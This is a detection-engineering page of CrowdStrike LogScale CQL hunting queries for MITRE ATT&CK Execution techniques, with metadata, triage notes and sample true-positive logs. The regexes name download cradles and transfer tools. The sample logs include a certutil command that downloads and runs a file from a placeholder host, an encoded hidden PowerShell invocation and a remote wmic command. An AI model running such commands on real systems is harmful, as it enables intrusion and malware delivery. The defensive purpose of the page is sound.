# TA0002 - Execution

[[00_Master_CQL_Index|← Master CQL Index]]

> Purpose: Atomic CQL/Falcon LogScale detections mapped to MITRE ATT&CK Execution. Each technique section includes Obsidian metadata callouts with Dataview-style inline fields and a production-ready CQL block grounded in LogScale pipe/filter/aggregation syntax.

---

### [[T1204.002]] - Malicious File

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1204.002
> technique_name:: Malicious File
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: High
> tags:: CQL, MITRE/Execution

* Detection Objective: Detect user-launched files from download/email temp locations spawning interpreters or installers. Strong signal for malicious attachment execution.
* Telemetry Requirements: ProcessRollup2, FileWritten

#### Production-Ready CQL Query:

```cql
// Title: User-Executed Download Spawning Script Chain
// Focus: Explorer/browser/mail parent launching script from Downloads/Temp
#event_simpleName=ProcessRollup2
| ParentBaseFileName=/^(explorer|chrome|msedge|firefox|outlook|teams)\.exe$/i
| ImageFileName=/\\(wscript|cscript|mshta|powershell|pwsh|cmd|rundll32|regsvr32)\.exe$/i
| CommandLine=/(\\Downloads\\|\\Content\.Outlook\\|\\INetCache\\|\\Temp\\|\.js|\.vbs|\.hta|\.lnk|\.iso|\.img)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: User-facing parent and downloaded/temp execution path.
* Triage Steps: Preserve downloaded file and email/chat context; check for persistence creation after execution.
* Potential False Positives: Legitimate scripts downloaded by administrators.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","ParentBaseFileName":"explorer.exe","FileName":"wscript.exe","CommandLine":"wscript.exe C:\\Users\\alice\\Downloads\\invoice.js"}
```

---

### [[T1204.002]] - Malicious File — CQL Hub: JAR files executed from %AppData%

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1204.002
> technique_name:: Malicious File
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: jar_file_executed_from_appdata.yml
> cql_hub_name:: JAR files executed from %AppData%
> cql_hub_author:: CrowdStrike
> cql_hub_mitre_ids:: T163
> related_mitre_ids:: T1204.002
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Execution, CQL_Hub

* Detection Objective: This query detects if a JAR file was executed from the %AppData% folder

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`jar_file_executed_from_appdata.yml`), author: CrowdStrike.
* Original CQL Hub MITRE IDs: T163.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=ProcessRollup2 
| ImageFileName=/javaw.exe/i CommandLine=/appdata/i
| table([aid, @timestamp, #event_simpleName, ImageFileName, SHA256HashData], limit=1000)

```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `jar_file_executed_from_appdata.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1059.001]] - PowerShell

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1059.001
> technique_name:: PowerShell
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: High
> tags:: CQL, MITRE/Execution

* Detection Objective: Detect obfuscated or download-capable PowerShell execution. Emphasizes behavioral switches and .NET invocation patterns over specific malware strings.
* Telemetry Requirements: ProcessRollup2, ScriptControlScanInfo

#### Production-Ready CQL Query:

```cql
// Title: Obfuscated or Download-Capable PowerShell
// Focus: Encoded commands, hidden window, download cradle, AMSI bypass markers
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(powershell|pwsh)\.exe$/i
| CommandLine=/(-enc\b|-encodedcommand|hidden|bypass|nop\b|DownloadString|DownloadFile|FromBase64String|IEX\s*\(|Invoke-Expression|Net\.WebClient|Reflection\.Assembly)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine, SHA256HashData])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: PowerShell flags and API usage commonly tied to in-memory execution.
* Triage Steps: Decode encoded content, inspect parent process, and correlate outbound connections. Cross-link to [[T1105]] if payload retrieval occurred.
* Potential False Positives: Admin automation frameworks, endpoint management scripts, legitimate encoded deployment commands.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"powershell.exe","CommandLine":"powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA"}
```

---

### [[T1059.001]] - PowerShell — CQL Hub: Powershell Command Length Anomaly Detection

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1059.001
> technique_name:: PowerShell
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Hunting_Powershell_Command_Length_Anomaly.yml
> cql_hub_name:: Powershell Command Length Anomaly Detection
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1059.001, T1027.010
> related_mitre_ids:: T1059.001, T1027.010
> required_modules:: Insight
> cql_hub_tags:: Detection
> tags:: CQL, MITRE/Execution, CQL_Hub

* Detection Objective: This query establishes a 7-day baseline of average PowerShell command lengths for each host. It then compares this baseline to the average command length of the last 24 hours. The query identifies hosts with a significant percentage increase in command length, which can be an indicator for obfuscation, fileless execution, or other malicious activities associated with "Living off the Land" techniques.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`Hunting_Powershell_Command_Length_Anomaly.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1059.001, T1027.010.
* Related/Resolved MITRE IDs: T1059.001, T1027.010.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(powershell(_ise)?|pwsh)\.exe/i
| CommandLength := length("CommandLine") | CommandLength>0
| aid=?AID
// Classify Data into Historical and LastDay
| case {
    test(@timestamp < (end() - duration(7d))) | DataSet:="Historical";
    test(@timestamp > (end() - duration(1d))) | DataSet:="LastDay";
    *
}
// Calculate Average Command Length
| groupBy([DataSet, aid], function=avg(CommandLength))
| case {
    DataSet="Historical" | rename(field="_avg", as="historicalAvg");
    DataSet="LastDay" | rename(field="_avg", as="todaysAvg");
    *
}
// Aggregate Averages
| groupBy([aid], function=[avg("historicalAvg", as=historicalAvg), avg("todaysAvg", as=todaysAvg)])
// Calculate Percentage Increase
| PercentIncrease := (todaysAvg - historicalAvg) / historicalAvg * 100
| format("%d", field=PercentIncrease, as=PercentIncrease)
| format(format="%.2f", field=[historicalAvg], as=historicalAvg)
// Filter and Sort Results
| PercentIncrease > 0
| sort(PercentIncrease, limit=10000)

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: ## Why Powershell is a Target for Attackers  Powershell is an integral part of modern Windows systems and offers powerful automation capabilities through its .NET integration. These features also make it attractive to attackers:  - **Pre-installed:** Available on every Windows system (no additional code needed). - **Powerful Access:** Direct access to Windows APIs and network resources. - **In-Memory Execution:** Capable of running code directly from memory (fileless execution). - **Often Under-Monitored:** Frequently lacks sufficient monitoring or restrictions.  Attackers use **"Living off the Land"** tactics to leverage PowerShell for stealthy attacks without deploying additional tools.  ## Why Command Length Deviations Indicate Threats  Attackers often employ methods that result in unusually long command lines. Monitoring deviations from normal command length is a valuable approach for detecting suspicious activity. Unusually long commands can indicate:  * **Obfuscation:**       * **Encoding:** Using Base64 (`-EncodedCommand`), hexadecimal, or ASCII to hide commands.       * **Escape Characters:** Using backticks (`) to impair readability.       * **Embedding Payloads:** Inserting entire scripts or binary payloads directly into the command line. * **Fileless Execution & LotL:** Complex one-liners are used to download and execute payloads from remote sources, leading to longer commands. * **Offensive Frameworks:** Tools like Empire, PowerSploit, or Cobalt Strike often generate long, obfuscated commands for their payloads.  Unusually long commands are a strong indicator because they directly correlate with common attacker techniques for evasion and execution (e.g., [T1027.010 Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/010/)). Legitimate administrative tasks rarely require the extreme lengths produced by these methods.  | Technique | Impact on Length | Description | | :--- | :--- | :--- | | Base64 (`-EncodedCommand`)| Significant Increase | Hides script content; very common for payload delivery. | | String Concatenation | Moderate/Variable Increase | Used to break up keywords and evade simple string matching. | | Remote Download Cradles | Variable (Often Long) | Commands like `IEX (New-Object Net.WebClient).DownloadString(...)` can be long. | | Embedded Scripts/Payloads | Significant Increase | Entire scripts or binaries are passed in the command line, nearing max length. |  ## The Power of Baselining: Establishing "Normal"  This query is based on the core idea of baselining "normal" activity for PowerShell command lengths and then identifying significant deviations from that norm.  ### Creating the Baseline  The query analyzes historical PowerShell executions over a defined period (7 days) to calculate statistical measures (the average) for command lengths. This establishes the expected range. By comparing the last day's average length against this historical baseline, the query can flag anomalous increases.  A **7-day baseline** is chosen to: -   Capture weekly operational cycles (e.g., weekend maintenance scripts). -   Balance stability and adaptability, smoothing out daily fluctuations while remaining responsive to real changes.
* Key Indicators: Review query output fields and filters from `Hunting_Powershell_Command_Length_Anomaly.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1059.001]] - PowerShell — CQL Hub: Suspicious PowerShell Execution

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1059.001
> technique_name:: PowerShell
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Suspicious_PowerShell_Execution.yml
> cql_hub_name:: Suspicious PowerShell Execution
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1059.001, T1070.005
> related_mitre_ids:: T1059.001, T1070.005
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Execution, CQL_Hub

* Detection Objective: This query identifies suspicious PowerShell execution patterns, including encoded commands and unusual parent processes, which could indicate malicious activity.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`Suspicious_PowerShell_Execution.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1059.001, T1070.005.
* Related/Resolved MITRE IDs: T1059.001, T1070.005.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=ProcessRollup2 ImageFileName=/\\powershell\\.exe/i
| CommandLine=/\s-[eE^]{1,2}[nN][cC][oO][dD][eE][mM][aA][nN][dD^]+\s/i
| join({#event_simpleName=UserIdentity}, field=AuthenticationID, include=[UserName])
| table([aid, UserName, ParentImageFileName, ImageFileName, CommandLine])

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: This query uses CrowdStrike Query Language (CQL) to detect suspicious PowerShell activity:  1. **Event Filtering**: `#event_simpleName=ProcessRollup2 ImageFileName=/\\powershell\\.exe/i`    - Searches ProcessRollup2 events for any PowerShell executable (case-insensitive)  2. **Command Line Analysis**: `CommandLine=/\s-[eE^]{1,2}[nN][cC][oO][dD][eE][mM][aA][nN][dD^]+\s/i`    - Uses regex to find encoded command parameters (-EncodedCommand, -enc, etc.)  3. **User Context**: `join({#event_simpleName=UserIdentity}, field=AuthenticationID, include=[UserName])`    - Enriches results with username information  4. **Output**: `table([aid, UserName, ParentImageFileName, ImageFileName, CommandLine])`    - Displays key fields for analysis
* Key Indicators: Review query output fields and filters from `Suspicious_PowerShell_Execution.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1059.003]] - Windows Command Shell

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1059.003
> technique_name:: Windows Command Shell
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: High
> tags:: CQL, MITRE/Execution

* Detection Objective: Detect cmd.exe used as an execution broker for download, encoded PowerShell, discovery, or chained execution.
* Telemetry Requirements: ProcessRollup2

#### Production-Ready CQL Query:

```cql
// Title: Suspicious Cmd Execution Broker
// Focus: cmd.exe with chaining, download, or interpreter handoff
#event_simpleName=ProcessRollup2
| ImageFileName=/\\cmd\.exe$/i
| CommandLine=/(\/c|\/k).*(powershell|mshta|rundll32|regsvr32|certutil|bitsadmin|curl|wget|&&|\|\||\^|%COMSPEC%)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Command shell chaining and handoff to LOLBAS or transfer utilities.
* Triage Steps: Review parent process and complete child process chain; decode escaping/caret obfuscation.
* Potential False Positives: Admin batch scripts and software installers.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"cmd.exe","CommandLine":"cmd /c certutil -urlcache -f http://host/a.exe a.exe && a.exe"}
```

---

### [[T1059.005]] - Visual Basic

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1059.005
> technique_name:: Visual Basic
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: High
> tags:: CQL, MITRE/Execution

* Detection Objective: Detect VBScript execution via wscript/cscript from email, downloads, temp, or with suspicious CreateObject usage.
* Telemetry Requirements: ProcessRollup2, ScriptControlScanInfo

#### Production-Ready CQL Query:

```cql
// Title: VBScript Execution from Untrusted Path
// Focus: wscript/cscript running .vbs/.vbe with network/shell objects
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(wscript|cscript)\.exe$/i
| CommandLine=/(\.vbs|\.vbe|CreateObject|WScript\.Shell|XMLHTTP|ADODB\.Stream|\\Downloads\\|\\Temp\\|\\Content\.Outlook\\)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Script host running VBScript with suspicious path or COM object tokens.
* Triage Steps: Collect script content and inspect spawned children.
* Potential False Positives: Legacy logon scripts and enterprise VBScript automation.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"wscript.exe","CommandLine":"wscript C:\\Users\\bob\\Downloads\\invoice.vbs"}
```

---

### [[T1059.007]] - JavaScript

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1059.007
> technique_name:: JavaScript
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: High
> tags:: CQL, MITRE/Execution

* Detection Objective: Detect Windows Script Host or Node executing JavaScript from untrusted paths or with shell/network object usage.
* Telemetry Requirements: ProcessRollup2, ScriptControlScanInfo

#### Production-Ready CQL Query:

```cql
// Title: JavaScript Script Host Execution
// Focus: wscript/cscript/node running JS from Downloads or Temp
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(wscript|cscript|node)\.exe$/i
| CommandLine=/(\.js|\.jse|WScript\.Shell|ActiveXObject|XMLHTTP|\\Downloads\\|\\Temp\\|\\Content\.Outlook\\)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: JavaScript execution via script host or node with suspicious paths/objects.
* Triage Steps: Preserve script and pivot to child process/network activity.
* Potential False Positives: Developer node scripts and legacy admin scripts.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"wscript.exe","CommandLine":"wscript.exe C:\\Users\\alice\\Downloads\\statement.js"}
```

---

### [[T1203]] - Exploitation for Client Execution

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1203
> technique_name:: Exploitation for Client Execution
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Execution

* Detection Objective: Detect client applications spawning crash handlers or shells after opening documents/web content, consistent with exploit-triggered execution.
* Telemetry Requirements: ProcessRollup2

#### Production-Ready CQL Query:

```cql
// Title: Client Application Exploit Child Process
// Focus: Office/PDF/browser parent launching unusual child or crash-to-shell chain
#event_simpleName=ProcessRollup2
| ParentBaseFileName=/^(winword|excel|powerpnt|acrord32|chrome|msedge|firefox)\.exe$/i
| ImageFileName=/\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|werfault)\.exe$/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Client process spawning shell/script/crash process unexpectedly.
* Triage Steps: Review document/URL opened and any exploit telemetry; inspect memory or crash artifacts if available.
* Potential False Positives: Application plugins or crash reporters; tune for known parent-child pairs.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","ParentBaseFileName":"AcroRd32.exe","FileName":"cmd.exe","CommandLine":"cmd.exe /c powershell -nop"}
```

---

### [[T1559.001]] - Component Object Model

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1559.001
> technique_name:: Component Object Model
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Execution

* Detection Objective: Detect COM/scriptlet execution through regsvr32, rundll32, PowerShell COM object creation, or suspicious CLSID usage.
* Telemetry Requirements: ProcessRollup2, RegistryValueSet

#### Production-Ready CQL Query:

```cql
// Title: COM Object Execution Abuse
// Focus: COM object creation or scriptlet proxy execution
#event_simpleName=ProcessRollup2
| CommandLine=/(New-Object\s+-ComObject|CreateObject\(|regsvr32|rundll32|CLSID|InprocServer32|Shell\.Application|WScript\.Shell|Excel\.Application)/i
| ImageFileName=/\\(powershell|pwsh|wscript|cscript|regsvr32|rundll32|mshta)\.exe$/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: COM object creation tokens and COM proxy binaries.
* Triage Steps: Identify COM class, parent process, and whether it spawned children or loaded remote content.
* Potential False Positives: Office automation and admin scripts.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"powershell.exe","CommandLine":"$x=New-Object -ComObject WScript.Shell; $x.Run(\"cmd\")"}
```

---

### [[T1129]] - Shared Modules

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1129
> technique_name:: Shared Modules
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Execution

* Detection Objective: Detect explicit DLL loading through rundll32/regsvr32 or PowerShell Add-Type from untrusted directories.
* Telemetry Requirements: ProcessRollup2, ImageLoad

#### Production-Ready CQL Query:

```cql
// Title: Suspicious Shared Module Load Invocation
// Focus: DLL load/proxy execution from user-writable paths
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(rundll32|regsvr32|powershell|pwsh)\.exe$/i
| CommandLine=/(LoadLibrary|Add-Type|DllImport|\.dll).*(\\Users\\|\\ProgramData\\|\\Temp\\|\\AppData\\)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: DLL load semantics and untrusted path reference.
* Triage Steps: Validate DLL signer/hash and file creation source; correlate with [[T1574.001]].
* Potential False Positives: Developer testing and legitimate DLL registration.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"rundll32.exe","CommandLine":"rundll32 C:\\Users\\Public\\mod.dll,Start"}
```

---

### [[T1047]] - Windows Management Instrumentation

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1047
> technique_name:: Windows Management Instrumentation
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: High
> tags:: CQL, MITRE/Execution

* Detection Objective: Detect WMI remote process creation patterns using wmic or PowerShell CIM/WMI methods.
* Telemetry Requirements: ProcessRollup2, NetworkConnectIP4

#### Production-Ready CQL Query:

```cql
// Title: WMI Remote Process Execution
// Focus: wmic process call create and Invoke-WmiMethod/Invoke-CimMethod
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(wmic|powershell|pwsh)\.exe$/i
| CommandLine=/((\/node:|\/node:).*(process\s+call\s+create)|Invoke-WmiMethod|Invoke-CimMethod|Win32_Process.*Create)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Remote WMI process creation syntax.
* Triage Steps: Extract remote node, command payload, and account used; check destination host process creation around the same time.
* Potential False Positives: Admin automation, SCCM/management tooling.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"wmic.exe","CommandLine":"wmic /node:HOST2 process call create \"cmd /c whoami\""}
```

---

### [[T1059]] - Command and Scripting Interpreter — CQL Hub: Detect Suspicious Windows Command-Line Activity Using System Utilities

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1059
> technique_name:: Command and Scripting Interpreter
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Detect_Suspicious_Windows_Command-Line_Activity_Using_System_Utilities.yml
> cql_hub_name:: Detect Suspicious Windows Command-Line Activity Using System Utilities
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1059
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Execution, CQL_Hub

* Detection Objective: The query analyzes Windows ProcessRollup2 events to identify unusual use of common administrative tools (e.g., net.exe, sc.exe, nltest.exe, systeminfo.exe). It assigns behavior weights based on command-line patterns, aggregates activity per host and hour, flags systems with high or frequent activity, and provides direct links for host investigation in Falcon.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`Detect_Suspicious_Windows_Command-Line_Activity_Using_System_Utilities.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
// Get all Windows ProcessRollup2 Events
#event_simpleName=ProcessRollup2 event_platform=Win
// Narrow to processes of interest and create FileName variable
| ImageFileName=/\\(?<FileName>(whoami|net1?|systeminfo|ping|nltest|sc|hostname|ipconfig)\.exe)/i
// Get timestamp value with date and hour value
| ProcessStartTime := ProcessStartTime*1000
| dayBucket := formatTime("%Y-%m-%d %H", field=ProcessStartTime, locale=en_US, timezone=Z)
// Force CommandLine and FileName into lower case
| CommandLine := lower(CommandLine)
| FileName := lower(FileName)
// Parse flag used in "net" command
| regex("(sc|net1?)\s+(?<netFlag>\S+)\s+", field=CommandLine, strict=false)
// Force netFlag to lower case
| netFlag := lower(netFlag)
// Create evaulation criteria and weighting for process usage; modified behaviorWeight integer as desired
| case {
       FileName=/net1?\.exe/ AND netFlag="start" | behaviorWeight := "4" ;
       FileName=/net1?\.exe/ AND netFlag="stop" | behaviorWeight := "4" ;
       FileName=/net1?\.exe/ AND netFlag="stop" AND CommandLine=/falcon/i | behaviorWeight := "25" ;
       FileName=/sc\.exe/ AND netFlag="start" | behaviorWeight := "4" ;
       FileName=/sc\.exe/ AND netFlag="stop" | behaviorWeight := "4" ;
       FileName=/sc\.exe/ AND netFlag=/(query|stop)/i AND CommandLine=/csagent/i | behaviorWeight := "25" ;
       FileName=/net1?\.exe/ AND netFlag="share" | behaviorWeight := "2" ;
       FileName=/net1?\.exe/ AND netFlag="user" AND CommandLine=/\/delete/i | behaviorWeight := "10" ;
       FileName=/net1?\.exe/ AND netFlag="user" AND CommandLine=/\/add/i | behaviorWeight := "10" ;
       FileName=/net1?\.exe/ AND netFlag="group" AND CommandLine=/\/domain\s+/i | behaviorWeight := "5" ;
       FileName=/net1?\.exe/ AND netFlag="group" AND CommandLine=/admin/i | behaviorWeight := "5" ;
       FileName=/net1?\.exe/ AND netFlag="localgroup" AND CommandLine=/\/add/i | behaviorWeight := "10" ;
       FileName=/net1?\.exe/ AND netFlag="localgroup" AND CommandLine=/\/delete/i | behaviorWeight := "10" ;
       FileName=/nltest\.exe/ | behaviorWeight := "3" ;
       FileName=/systeminfo\.exe/ | behaviorWeight := "3" ;
       FileName=/whoami\.exe/ | behaviorWeight := "3" ;
       FileName=/ping\.exe/ | behaviorWeight := "3" ;
       FileName=/hostname\.exe/ | behaviorWeight := "3" ;
       FileName=/ipconfig\.exe/ | behaviorWeight := "3" ;
 * }
| default(field=behaviorWeight, value=1)
// Create FileName and CommandLine one-liner
| format(format="(Score: %s) %s • %s", field=[behaviorWeight, FileName, CommandLine], as="executionDetails")
// Group and organize output
| groupby([cid,aid, dayBucket], function=[count(FileName, distinct=true, as="fileCount"), sum(behaviorWeight, as="behaviorWeight"), series(executionDetails)], limit=max)
// Set thresholds
| fileCount >= 5 OR behaviorWeight > 30
// Add Host Search link
| format("[Host Search](https://falcon.crowdstrike.com/investigate/events/en-us/app/eam2/investigate__computer?earliest=-24h&latest=now&computer=*&aid_tok=%s&customer_tok=*)", field=["aid"], as="Host Search")
// Sort descending by behavior weighting
| sort(behaviorWeight)
| drop([@timestamp, _duration])

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Reference: [GitHub CrowdStrike/logscale-community](https://github.com/CrowdStrike/logscale-community-content/blob/main/Queries-Only/Helpful-CQL-Queries/Custom%20Weighting%20Command%20Line%20and%20File%20Name.md)
* Key Indicators: Review query output fields and filters from `Detect_Suspicious_Windows_Command-Line_Activity_Using_System_Utilities.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1059]] - Command and Scripting Interpreter — CQL Hub: Detect and Decode Base64-Encoded PowerShell Commands - http

> [!metadata]+ Detection Metadata
> tactic:: Execution
> technique_id:: T1059
> technique_name:: Command and Scripting Interpreter
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Detect_and_Decode_Base64-Encoded_PowerShell_Commands-http.yml
> cql_hub_name:: Detect and Decode Base64-Encoded PowerShell Commands - http
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1059
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Execution, CQL_Hub

* Detection Objective: The query identifies Windows PowerShell executions using encoded commands, extracts and decodes Base64 payloads (including nested encodings), counts occurrences and unique hosts, and outputs decoded command content for analysis of potentially obfuscated activity.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`Detect_and_Decode_Base64-Encoded_PowerShell_Commands-http.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=ProcessRollup2 event_platform=Win ImageFileName=/.*\\powershell\.exe/
| CommandLine=/.*\s+\-(e|encoded|encodedcommand|enc)\s+.*/
| length("CommandLine", as="cmdLength")
| groupby([CommandLine], function=stats([count(aid, distinct=true, as="uniqueEndpointCount"), count(aid, as="executionCount")]), limit=max)
| EncodedString := splitString(field=CommandLine, by="-e* ", index=1)
| CmdLinePrefix := splitString(field=CommandLine, by="-e* ", index=0)
| DecodedString := base64Decode(EncodedString, charset="UTF-16LE")
// Look for encoded messages in the decoded message and decode those too.
| case {
  DecodedString = /encoded/i
  | SubEncodedString := splitString(field=DecodedString, by="-EncodedCommand ", index=1)
  | SubCmdLinePrefix := splitString(field=EncodedString, by="-EncodedCommand ", index=0)
  | SubDecodedString := base64Decode(SubEncodedString, charset="UTF-16LE");
  *
}
| DecodedString=/.*https?\:\/\/.*/
| table([executionCount, uniqueEndpoitnCount, DecodedString, CommandLine])
| sort(executionCount, order=desc)

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Reference: [GitHub CrowdStrike/logscale-community](https://github.com/CrowdStrike/logscale-community-content/blob/main/Queries-Only/Helpful-CQL-Queries/Decode%20Base64.md)
* Key Indicators: Review query output fields and filters from `Detect_and_Decode_Base64-Encoded_PowerShell_Commands-http.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
